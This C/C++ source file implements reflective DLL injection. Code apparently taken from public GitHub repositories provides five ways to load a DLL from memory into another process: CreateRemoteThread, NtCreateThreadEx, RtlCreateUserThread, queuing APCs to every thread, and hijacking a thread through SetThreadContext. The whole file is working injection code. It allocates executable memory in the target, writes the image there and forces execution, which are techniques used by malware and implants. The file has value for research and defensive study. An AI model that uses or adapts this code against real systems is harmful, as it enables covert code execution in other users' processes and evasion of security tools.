/*
* Github: https://github.com/stephenfewer/ReflectiveDLLInjection
*/

#include "reflective_injection.h"

BOOL InjectToProcess_CreateRemoteThread(DWORD dwProcessId, LPVOID lpBuffer, DWORD dwLength)
{
	HANDLE hProcess = OpenProcess(PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION | PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_VM_READ, FALSE, dwProcessId);
	if (!hProcess)
	{
#ifdef DEBUG
		printf("[-] Failed to open process with pid: %d\n", dwProcessId);
#endif
		return FALSE;
	}

	HANDLE hModule = LoadRemoteLibraryR_CreateRemoteThread(hProcess, lpBuffer, dwLength, NULL);
	if (!hModule)
	{
#ifdef DEBUG
		printf("[-] Failed to inject the DLL\n");
#endif
		return FALSE;
	}

#ifdef DEBUG
	printf("[+] Injected the DLL into process %d\n", dwProcessId);
#endif

	WaitForSingleObject(hModule, -1);

	CloseHandle(hProcess);

	return TRUE;
}

BOOL InjectToProcess_NtCreateThreadEx(DWORD dwProcessId, LPVOID lpBuffer, DWORD dwLength)
{
	HANDLE hProcess = OpenProcess(PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION | PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_VM_READ, FALSE, dwProcessId);
	if (!hProcess)
	{
#ifdef DEBUG
		printf("[-] Failed to open process with pid: %d\n", dwProcessId);
#endif
		return FALSE;
	}

	HANDLE hModule = LoadRemoteLibraryR_NtCreateThreadEx(hProcess, lpBuffer, dwLength, NULL);
	if (!hModule)
	{
#ifdef DEBUG
		printf("[-] Failed to inject the DLL\n");
#endif
		return FALSE;
	}

#ifdef DEBUG
	printf("[+] Injected the DLL into process %d\n", dwProcessId);
#endif

	WaitForSingleObject(hModule, -1);

	CloseHandle(hProcess);

	return TRUE;
}

BOOL InjectToProcess_pfnRtlCreateUserThread(DWORD dwProcessId, LPVOID lpBuffer, DWORD dwLength)
{
	HANDLE hProcess = OpenProcess(PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION | PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_VM_READ, FALSE, dwProcessId);
	if (!hProcess)
	{
#ifdef DEBUG
		printf("[-] Failed to open process with pid: %d\n", dwProcessId);
#endif
		return FALSE;
	}

	HANDLE hModule = LoadRemoteLibraryR_pfnRtlCreateUserThread(hProcess, lpBuffer, dwLength, NULL);
	if (!hModule)
	{
#ifdef DEBUG
		printf("[-] Failed to inject the DLL\n");
#endif
		return FALSE;
	}

#ifdef DEBUG
	printf("[+] Injected the DLL into process %d\n", dwProcessId);
#endif

	WaitForSingleObject(hModule, -1);

	CloseHandle(hProcess);

	return TRUE;
}

BOOL InjectToProcess_QueueUserAPC(DWORD dwProcessId, LPVOID lpBuffer, DWORD dwLength)
{
	HANDLE hProcess = OpenProcess(PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION | PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_VM_READ, FALSE, dwProcessId);
	if (!hProcess)
	{
#ifdef DEBUG
		printf("[-] Failed to open process with pid: %d\n", dwProcessId);
#endif
		return FALSE;
	}

	DWORD result = LoadRemoteLibraryR_QueueUserAPC(dwProcessId, hProcess, lpBuffer, dwLength, NULL);
	if (result == 0)
	{
#ifdef DEBUG
		printf("[-] Failed to inject the DLL\n");
#endif
		return FALSE;
	}

#ifdef DEBUG
	printf("[+] Injected the DLL into process %d\n", dwProcessId);
#endif

	CloseHandle(hProcess);

	return TRUE;
}

BOOL InjectToProcess_SetThreadContext(DWORD dwProcessId, LPVOID lpBuffer, DWORD dwLength)
{
	HANDLE hProcess = OpenProcess(PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION | PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_VM_READ, FALSE, dwProcessId);
	if (!hProcess)
	{
#ifdef DEBUG
		printf("[-] Failed to open process with pid: %d\n", dwProcessId);
#endif
		return FALSE;
	}

	DWORD result = LoadRemoteLibraryR_SetThreadContext(dwProcessId, hProcess, lpBuffer, dwLength, NULL);
	if (result == 0)
	{
#ifdef DEBUG
		printf("[-] Failed to inject the DLL\n");
#endif
		return FALSE;
	}

#ifdef DEBUG
	printf("[+] Injected the DLL into process %d\n", dwProcessId);
#endif

	CloseHandle(hProcess);

	return TRUE;
}


DWORD Rva2Offset(DWORD dwRva, UINT_PTR uiBaseAddress)
{
	WORD wIndex = 0;
	PIMAGE_SECTION_HEADER pSectionHeader = NULL;
	PIMAGE_NT_HEADERS pNtHeaders = NULL;

	pNtHeaders = (PIMAGE_NT_HEADERS)(uiBaseAddress + ((PIMAGE_DOS_HEADER)uiBaseAddress)->e_lfanew);

	pSectionHeader = (PIMAGE_SECTION_HEADER)((UINT_PTR)(&pNtHeaders->OptionalHeader) + pNtHeaders->FileHeader.SizeOfOptionalHeader);

	if (dwRva < pSectionHeader[0].PointerToRawData)
		return dwRva;

	for (wIndex = 0; wIndex < pNtHeaders->FileHeader.NumberOfSections; wIndex++)
	{
		if (dwRva >= pSectionHeader[wIndex].VirtualAddress && dwRva < (pSectionHeader[wIndex].VirtualAddress + pSectionHeader[wIndex].SizeOfRawData))
			return (dwRva - pSectionHeader[wIndex].VirtualAddress + pSectionHeader[wIndex].PointerToRawData);
	}

	return 0;
}
//===============================================================================================//
DWORD GetReflectiveLoaderOffset(VOID* lpReflectiveDllBuffer)
{
	UINT_PTR uiBaseAddress = 0;
	UINT_PTR uiExportDir = 0;
	UINT_PTR uiNameArray = 0;
	UINT_PTR uiAddressArray = 0;
	UINT_PTR uiNameOrdinals = 0;
	DWORD dwCounter = 0;
#ifdef WIN_X64
	DWORD dwCompiledArch = 2;
#else
	// This will catch Win32 and WinRT.
	DWORD dwCompiledArch = 1;
#endif

	uiBaseAddress = (UINT_PTR)lpReflectiveDllBuffer;

	// get the File Offset of the modules NT Header
	uiExportDir = uiBaseAddress + ((PIMAGE_DOS_HEADER)uiBaseAddress)->e_lfanew;

	// currenlty we can only process a PE file which is the same type as the one this fuction has  
	// been compiled as, due to various offset in the PE structures being defined at compile time.
	if (((PIMAGE_NT_HEADERS)uiExportDir)->OptionalHeader.Magic == 0x010B) // PE32
	{
		if (dwCompiledArch != 1)
			return 0;
	}
	else if (((PIMAGE_NT_HEADERS)uiExportDir)->OptionalHeader.Magic == 0x020B) // PE64
	{
		if (dwCompiledArch != 2)
			return 0;
	}
	else
	{
		return 0;
	}

	// uiNameArray = the address of the modules export directory entry
	uiNameArray = (UINT_PTR) & ((PIMAGE_NT_HEADERS)uiExportDir)->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT];

	// get the File Offset of the export directory
	uiExportDir = uiBaseAddress + Rva2Offset(((PIMAGE_DATA_DIRECTORY)uiNameArray)->VirtualAddress, uiBaseAddress);

	// get the File Offset for the array of name pointers
	uiNameArray = uiBaseAddress + Rva2Offset(((PIMAGE_EXPORT_DIRECTORY)uiExportDir)->AddressOfNames, uiBaseAddress);

	// get the File Offset for the array of addresses
	uiAddressArray = uiBaseAddress + Rva2Offset(((PIMAGE_EXPORT_DIRECTORY)uiExportDir)->AddressOfFunctions, uiBaseAddress);

	// get the File Offset for the array of name ordinals
	uiNameOrdinals = uiBaseAddress + Rva2Offset(((PIMAGE_EXPORT_DIRECTORY)uiExportDir)->AddressOfNameOrdinals, uiBaseAddress);

	// get a counter for the number of exported functions...
	dwCounter = ((PIMAGE_EXPORT_DIRECTORY)uiExportDir)->NumberOfNames;

	// loop through all the exported functions to find the ReflectiveLoader
	while (dwCounter--)
	{
		char* cpExportedFunctionName = (char*)(uiBaseAddress + Rva2Offset(DEREF_32(uiNameArray), uiBaseAddress));

		if (strstr(cpExportedFunctionName, DLL_REFLECTIVE_FUNCTION) != NULL)
		{
			// get the File Offset for the array of addresses
			uiAddressArray = uiBaseAddress + Rva2Offset(((PIMAGE_EXPORT_DIRECTORY)uiExportDir)->AddressOfFunctions, uiBaseAddress);

			// use the functions name ordinal as an index into the array of name pointers
			uiAddressArray += (DEREF_16(uiNameOrdinals) * sizeof(DWORD));

			// return the File Offset to the ReflectiveLoader() functions code...
			return Rva2Offset(DEREF_32(uiAddressArray), uiBaseAddress);
		}
		// get the next exported function name
		uiNameArray += sizeof(DWORD);

		// get the next exported function name ordinal
		uiNameOrdinals += sizeof(WORD);
	}

	return 0;
}
//===============================================================================================//
// Loads a DLL image from memory via its exported ReflectiveLoader function
HMODULE WINAPI LoadLibraryR(LPVOID lpBuffer, DWORD dwLength)
{
	HMODULE hResult = NULL;
	DWORD dwReflectiveLoaderOffset = 0;
	DWORD dwOldProtect1 = 0;
	DWORD dwOldProtect2 = 0;
	REFLECTIVELOADER pReflectiveLoader = NULL;
	DLLMAIN pDllMain = NULL;

	if (lpBuffer == NULL || dwLength == 0)
		return NULL;

	__try
	{
		// check if the library has a ReflectiveLoader...
		dwReflectiveLoaderOffset = GetReflectiveLoaderOffset(lpBuffer);
		if (dwReflectiveLoaderOffset != 0)
		{
			pReflectiveLoader = (REFLECTIVELOADER)((UINT_PTR)lpBuffer + dwReflectiveLoaderOffset);

			// we must VirtualProtect the buffer to RWX so we can execute the ReflectiveLoader...
			// this assumes lpBuffer is the base address of the region of pages and dwLength the size of the region
			if (VirtualProtect(lpBuffer, dwLength, PAGE_EXECUTE_READWRITE, &dwOldProtect1))
			{
				// call the librarys ReflectiveLoader...
				pDllMain = (DLLMAIN)pReflectiveLoader();
				if (pDllMain != NULL)
				{
					// call the loaded librarys DllMain to get its HMODULE
					if (!pDllMain(NULL, DLL_QUERY_HMODULE, &hResult))
						hResult = NULL;
				}
				// revert to the previous protection flags...
				VirtualProtect(lpBuffer, dwLength, dwOldProtect1, &dwOldProtect2);
			}
		}
	}
	__except (EXCEPTION_EXECUTE_HANDLER)
	{
		hResult = NULL;
	}

	return hResult;
}
//===============================================================================================//
// Loads a PE image from memory into the address space of a host process via the image's exported ReflectiveLoader function
// Note: You must compile whatever you are injecting with REFLECTIVEDLLINJECTION_VIA_LOADREMOTELIBRARYR 
//       defined in order to use the correct RDI prototypes.
// Note: The hProcess handle must have these access rights: PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION | 
//       PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_VM_READ
// Note: If you are passing in an lpParameter value, if it is a pointer, remember it is for a different address space.
// Note: This function currently cant inject accross architectures, but only to architectures which are the 
//       same as the arch this function is compiled as, e.g. x86->x86 and x64->x64 but not x64->x86 or x86->x64.
HANDLE WINAPI LoadRemoteLibraryR_CreateRemoteThread(HANDLE hProcess, LPVOID lpBuffer, DWORD dwLength, LPVOID lpParameter)
{
	BOOL bSuccess = FALSE;
	LPVOID lpRemoteLibraryBuffer = NULL;
	LPTHREAD_START_ROUTINE lpReflectiveLoader = NULL;
	HANDLE hThread = NULL;
	DWORD dwReflectiveLoaderOffset = 0;
	DWORD dwThreadId = 0;

	if (!hProcess || !lpBuffer || !dwLength)
		return NULL;

	// check if the library has a ReflectiveLoader...
	dwReflectiveLoaderOffset = GetReflectiveLoaderOffset(lpBuffer);
	if (!dwReflectiveLoaderOffset)
		return NULL;

	// alloc memory (RWX) in the host process for the image...
	lpRemoteLibraryBuffer = VirtualAllocEx(hProcess, NULL, dwLength, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);
	if (!lpRemoteLibraryBuffer)
		return NULL;

	// write the image into the host process...
	if (!WriteProcessMemory(hProcess, lpRemoteLibraryBuffer, lpBuffer, dwLength, NULL))
		return NULL;

	// add the offset to ReflectiveLoader() to the remote library address...
	lpReflectiveLoader = (LPTHREAD_START_ROUTINE)((ULONG_PTR)lpRemoteLibraryBuffer + dwReflectiveLoaderOffset);

	// create a remote thread in the host process to call the ReflectiveLoader!
	hThread = CreateRemoteThread(hProcess, NULL, 1024 * 1024, lpReflectiveLoader, lpParameter, (DWORD)NULL, &dwThreadId);

	ResumeThread(hThread);

	return hThread;
}
//===============================================================================================//

// Using NtCreateThreadEx
// Source : https://github.com/3gstudent/Inject-dll-by-APC

typedef LONG NTSTATUS;
typedef NTSTATUS(NTAPI* pfnNtCreateThreadEx)
(
	OUT PHANDLE hThread,
	IN ACCESS_MASK DesiredAccess,
	IN PVOID ObjectAttributes,
	IN HANDLE ProcessHandle,
	IN PVOID lpStartAddress,
	IN PVOID lpParameter,
	IN ULONG Flags,
	IN SIZE_T StackZeroBits,
	IN SIZE_T SizeOfStackCommit,
	IN SIZE_T SizeOfStackReserve,
	OUT PVOID lpBytesBuffer);

HANDLE WINAPI LoadRemoteLibraryR_NtCreateThreadEx(HANDLE hProcess, LPVOID lpBuffer, DWORD dwLength, LPVOID lpParameter)
{
	BOOL bSuccess = FALSE;
	LPVOID lpRemoteLibraryBuffer = NULL;
	LPTHREAD_START_ROUTINE lpReflectiveLoader = NULL;
	HANDLE hThread = NULL;
	DWORD dwReflectiveLoaderOffset = 0;
	DWORD dwThreadId = 0;

	if (!hProcess || !lpBuffer || !dwLength)
		return NULL;

	// check if the library has a ReflectiveLoader...
	dwReflectiveLoaderOffset = GetReflectiveLoaderOffset(lpBuffer);
	if (!dwReflectiveLoaderOffset)
		return NULL;

	// alloc memory (RWX) in the host process for the image...
	lpRemoteLibraryBuffer = VirtualAllocEx(hProcess, NULL, dwLength, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);
	if (!lpRemoteLibraryBuffer)
		return NULL;

	// write the image into the host process...
	if (!WriteProcessMemory(hProcess, lpRemoteLibraryBuffer, lpBuffer, dwLength, NULL))
		return NULL;

	// add the offset to ReflectiveLoader() to the remote library address...
	lpReflectiveLoader = (LPTHREAD_START_ROUTINE)((ULONG_PTR)lpRemoteLibraryBuffer + dwReflectiveLoaderOffset);

	// Using NtCreateThreadEx
	pfnNtCreateThreadEx NtCreateThreadEx = (pfnNtCreateThreadEx)GetProcAddress(GetModuleHandle("ntdll.dll"), "NtCreateThreadEx");
	if (NtCreateThreadEx == NULL)
	{
		return NULL;
	}

	NtCreateThreadEx(&hThread, 0x1FFFFF, NULL, hProcess, lpReflectiveLoader, lpParameter, FALSE, NULL, NULL, NULL, NULL);

	ResumeThread(hThread);

	return hThread;
}

//===============================================================================================//

// Using pfnRtlCreateUserThread
// Source : https://github.com/3gstudent/Inject-dll-by-APC

typedef struct _CLIENT_ID {
	HANDLE UniqueProcess;
	HANDLE UniqueThread;
} CLIENT_ID, * PCLIENT_ID;

typedef NTSTATUS(NTAPI* pfnRtlCreateUserThread)(
	IN HANDLE ProcessHandle,
	IN PSECURITY_DESCRIPTOR SecurityDescriptor OPTIONAL,
	IN BOOLEAN CreateSuspended,
	IN ULONG StackZeroBits OPTIONAL,
	IN SIZE_T StackReserve OPTIONAL,
	IN SIZE_T StackCommit OPTIONAL,
	IN PTHREAD_START_ROUTINE StartAddress,
	IN PVOID Parameter OPTIONAL,
	OUT PHANDLE ThreadHandle OPTIONAL,
	OUT PCLIENT_ID ClientId OPTIONAL);

HANDLE WINAPI LoadRemoteLibraryR_pfnRtlCreateUserThread(HANDLE hProcess, LPVOID lpBuffer, DWORD dwLength, LPVOID lpParameter)
{
	BOOL bSuccess = FALSE;
	LPVOID lpRemoteLibraryBuffer = NULL;
	LPTHREAD_START_ROUTINE lpReflectiveLoader = NULL;
	HANDLE hThread = NULL;
	DWORD dwReflectiveLoaderOffset = 0;
	DWORD dwThreadId = 0;

	if (!hProcess || !lpBuffer || !dwLength)
		return NULL;

	// check if the library has a ReflectiveLoader...
	dwReflectiveLoaderOffset = GetReflectiveLoaderOffset(lpBuffer);
	if (!dwReflectiveLoaderOffset)
		return NULL;

	// alloc memory (RWX) in the host process for the image...
	lpRemoteLibraryBuffer = VirtualAllocEx(hProcess, NULL, dwLength, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);
	if (!lpRemoteLibraryBuffer)
		return NULL;

	// write the image into the host process...
	if (!WriteProcessMemory(hProcess, lpRemoteLibraryBuffer, lpBuffer, dwLength, NULL))
		return NULL;

	// add the offset to ReflectiveLoader() to the remote library address...
	lpReflectiveLoader = (LPTHREAD_START_ROUTINE)((ULONG_PTR)lpRemoteLibraryBuffer + dwReflectiveLoaderOffset);

	// Using NtCreateThreadEx
	pfnRtlCreateUserThread RtlCreateUserThread = (pfnRtlCreateUserThread)GetProcAddress(GetModuleHandle("ntdll.dll"), "RtlCreateUserThread");
	if (RtlCreateUserThread == NULL)
	{
		return NULL;
	}

	RtlCreateUserThread(hProcess, NULL, FALSE, 0, 0, 0, lpReflectiveLoader, lpParameter, &hThread, NULL);

	ResumeThread(hThread);

	return hThread;
}

//===============================================================================================//

// Using QueueUserAPC
// Source : https://github.com/MahmoudZohdy/Process-Injection-Techniques/blob/main/Process_Injection_Techniques/Process_Injection_Techniques/Injection.h

DWORD WINAPI LoadRemoteLibraryR_QueueUserAPC(DWORD processId, HANDLE hProcess, LPVOID lpBuffer, DWORD dwLength, LPVOID lpParameter)
{
	BOOL bSuccess = FALSE;
	LPVOID lpRemoteLibraryBuffer = NULL;
	LPTHREAD_START_ROUTINE lpReflectiveLoader = NULL;
	HANDLE hThread = NULL;
	DWORD dwReflectiveLoaderOffset = 0;
	DWORD dwThreadId = 0;

	if (!hProcess || !lpBuffer || !dwLength)
		return NULL;

	// check if the library has a ReflectiveLoader...
	dwReflectiveLoaderOffset = GetReflectiveLoaderOffset(lpBuffer);
	if (!dwReflectiveLoaderOffset)
		return NULL;

	// alloc memory (RWX) in the host process for the image...
	lpRemoteLibraryBuffer = VirtualAllocEx(hProcess, NULL, dwLength, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);
	if (!lpRemoteLibraryBuffer)
		return NULL;

	// write the image into the host process...
	if (!WriteProcessMemory(hProcess, lpRemoteLibraryBuffer, lpBuffer, dwLength, NULL))
		return NULL;

	// add the offset to ReflectiveLoader() to the remote library address...
	lpReflectiveLoader = (LPTHREAD_START_ROUTINE)((ULONG_PTR)lpRemoteLibraryBuffer + dwReflectiveLoaderOffset);

	std::vector<DWORD> ThreadIds;
	HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
	THREADENTRY32 threadEntry = { sizeof(THREADENTRY32) };

	if (Thread32First(snapshot, &threadEntry)) {
		do {
			if (threadEntry.th32OwnerProcessID == processId) {
				ThreadIds.push_back(threadEntry.th32ThreadID);
			}
		} while (Thread32Next(snapshot, &threadEntry));
	}
	
	bool success = false;
	// Queue APC From all threads in the process
	for (DWORD threadId : ThreadIds) {
		hThread = OpenThread(THREAD_ALL_ACCESS, TRUE, threadId);
		if (!hThread)
			continue;

		DWORD status = QueueUserAPC((PAPCFUNC)lpReflectiveLoader, hThread, (ULONG_PTR)lpParameter);
		if (status)
		{
			success = true;
		}

		Sleep(2 * 1000);
		CloseHandle(hThread);

		/*
		if (success)
			break;
		*/

	}

	if (success)
		return 1;
	else
		return NULL;
}

//===============================================================================================//

// Using SetThreadContext
// Source : https://github.com/MahmoudZohdy/Process-Injection-Techniques/blob/main/Process_Injection_Techniques/Process_Injection_Techniques/Injection.h

DWORD WINAPI LoadRemoteLibraryR_SetThreadContext(DWORD processId, HANDLE hProcess, LPVOID lpBuffer, DWORD dwLength, LPVOID lpParameter)
{
	BOOL bSuccess = FALSE;
	LPVOID lpRemoteLibraryBuffer = NULL;
	LPTHREAD_START_ROUTINE lpReflectiveLoader = NULL;
	HANDLE hThread = NULL;
	DWORD dwReflectiveLoaderOffset = 0;
	DWORD dwThreadId = 0;

	if (!hProcess || !lpBuffer || !dwLength)
		return NULL;

	// check if the library has a ReflectiveLoader...
	dwReflectiveLoaderOffset = GetReflectiveLoaderOffset(lpBuffer);
	if (!dwReflectiveLoaderOffset)
		return NULL;

	// alloc memory (RWX) in the host process for the image...
	lpRemoteLibraryBuffer = VirtualAllocEx(hProcess, NULL, dwLength, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);
	if (!lpRemoteLibraryBuffer)
		return NULL;

	// write the image into the host process...
	if (!WriteProcessMemory(hProcess, lpRemoteLibraryBuffer, lpBuffer, dwLength, NULL))
		return NULL;

	// add the offset to ReflectiveLoader() to the remote library address...
	lpReflectiveLoader = (LPTHREAD_START_ROUTINE)((ULONG_PTR)lpRemoteLibraryBuffer + dwReflectiveLoaderOffset);

	std::vector<DWORD> ThreadIds;
	HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
	THREADENTRY32 threadEntry = { sizeof(THREADENTRY32) };

	CONTEXT ThreadContext;
	memset(&ThreadContext, 0, sizeof(CONTEXT));
	ThreadContext.ContextFlags = CONTEXT_ALL;

	bool success = false;
	if (Thread32First(snapshot, &threadEntry)) {
		do {
			if (threadEntry.th32OwnerProcessID == processId) {

				HANDLE hThread = OpenThread(THREAD_ALL_ACCESS, TRUE, threadEntry.th32ThreadID);
				if (!hThread) {
					printf("Failed to Open handle to Thread TID %d  Error Code is0x%x\n", processId, GetLastError());
					continue;
				}

				DWORD status = SuspendThread(hThread);
				if (status == -1)
				{
					printf("Failed to suspend thread: %d\n", GetLastError());
					CloseHandle(hThread);
					continue;
				}

				if (GetThreadContext(hThread, &ThreadContext))
				{
					printf("getThreadContext\n");
#if WIN_X64			
					ThreadContext.Rip = (DWORD64)lpReflectiveLoader;
#else
					ThreadContext.Eip = (DWORD64)lpReflectiveLoader;
#endif
					if (!SetThreadContext(hThread, &ThreadContext)) {
#ifdef DEBUG
						printf("Failed to Set Thread Context to Thread TID %d  Error Code is0x%x\n", processId, GetLastError());
#endif
						CloseHandle(hThread);
						continue;
					}
					status = ResumeThread(hThread);
					if (status == -1) {
#ifdef DEBUG
						printf("Failed to Resume Thread TID %d  Error Code is0x%x\n", processId, GetLastError());
#endif
						CloseHandle(hThread);
						continue;
					}
					else
					{
						success = true;
					}

					printf("Done\n");

					CloseHandle(hThread);
					break;
				}

			}
		} while (Thread32Next(snapshot, &threadEntry));
	}

	if (success)
		return 1;
	else
		return NULL;
}